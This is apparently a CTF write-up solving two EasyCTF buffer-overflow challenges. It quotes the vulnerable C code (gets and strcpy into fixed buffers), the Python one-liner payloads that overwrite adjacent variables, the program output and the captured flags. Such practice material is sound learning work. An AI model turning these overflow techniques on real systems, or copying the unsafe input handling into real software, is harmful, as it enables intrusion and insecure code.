Binary Exploitation
------

Buffering - 80 pts
----------
Can you overflow the stack? Try it at `/problems/overflow1` on the EasyCTF shell server. The source is available at `/problems/overflow1/overflow1.c`, and the program you're trying to overflow is at `/problems/overflow1/overflow1`. Good luck!

**Hint**:
Read a little bit about the stack [here](https://www.exploit-db.com/docs/28475.pdf).

As the question says; our task, here, is to overflow the stack and grab the flag somehow. The program, thus, is made vulnerable to Buffer Overflow.
The program checks the value of variable `x`, and if it equals `1337`, prints the contents of `flag.txt`. However, `x`s value has been set to `0`.
Therefore, we need to alter its value, and set it to `1337` by overflowing the stack.

Source can be found [here](https://gist.github.com/1lastBr3ath/cf975f6acd32f662b52a).

Here's what we need to keep note of;</br>
```C
  char buf[20];
  int x = 0;
  gets(buf);
  if (x == 1337) {
```
The buffer is `20` bytes, and right after the buffer in memory is `x`. So, if we give more than 20 bytes, we can change `x`.

Checking where the overflow happens;<br/>
```zsh
$python -c "print 'A'*24"|./overflow1 
0
$python -c "print 'A'*28"|./overflow1 
0
$python -c "print 'A'*32"|./overflow1 
1094795585
```
And, there it is. Now, we know where the buffer overflow happens, we can pass in the value we want, and it will be set as the value of `x`.
1337, converted to hex, equals 539, and since it's an x86 machine, we need to pass the value in little endian format.<br/>
Let's overflow the stack ;)<br/>
```zsh
$python -c "print 'A'*28+'\x39\x05\x00\x00'"|./overflow1 
Here's a flag: easyctf{i_wish_everything_were_th1s_34sy}

1337
```
Flag: `easyctf{i_wish_everything_were_th1s_34sy}`

---------

Much Studying - 400 points 
-----------
I suck at AP Lit (what is engwrish). I was able to steal the grader for the AP Lit test from the CollageBored, but it's not helping me do any better. Can you help me?

Source can be found [here](https://www.easyctf.com/static/problems/aplit/aplit.c), and the binary with the actual flag is on the shell server at `/problems/aplit`.

**Hint**:
Oh poop! Forgot to give you my prompt. Here it is: Choose a novel that you hate, and then write an essay about it.

This is very similar to previous one. The input is taken from command line, and `buf` is 700 bytes. 
However, since it's only checking if `score` is greater than 12, any value > 12 may work. Therefore, we can overflow it with 'A's only, because `A` equals `65` in ASCII representation, which is far greater than 12.

Here's what we need to keep note of;<br/>
```C
	char buf[700];
	strcpy(buf, argv[1]);
	printf("-------------- YOUR SUBMISSION --------------\n");
	printf("%s\n", buf);
	printf("---------------------------------------------\n");
	printf("According to our analysis, your response received a grade of %d!\n", score);
	if (score > 12) {
```

The output is too long to embed here for every check. So, I'm only including the output of one that worked;<br/>
```zsh
$./aplit $(python -c "print 'A'*717")
CollageBored (R) Advanced Placement Literature Grader
-------------- YOUR SUBMISSION --------------
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
---------------------------------------------
According to our analysis, your response received a grade of 65!
Wow, you're an HONOR student! Here's a flag: easyctf{essays_are_too_hard}
```
Flag: `easyctf{essays_are_too_hard}`
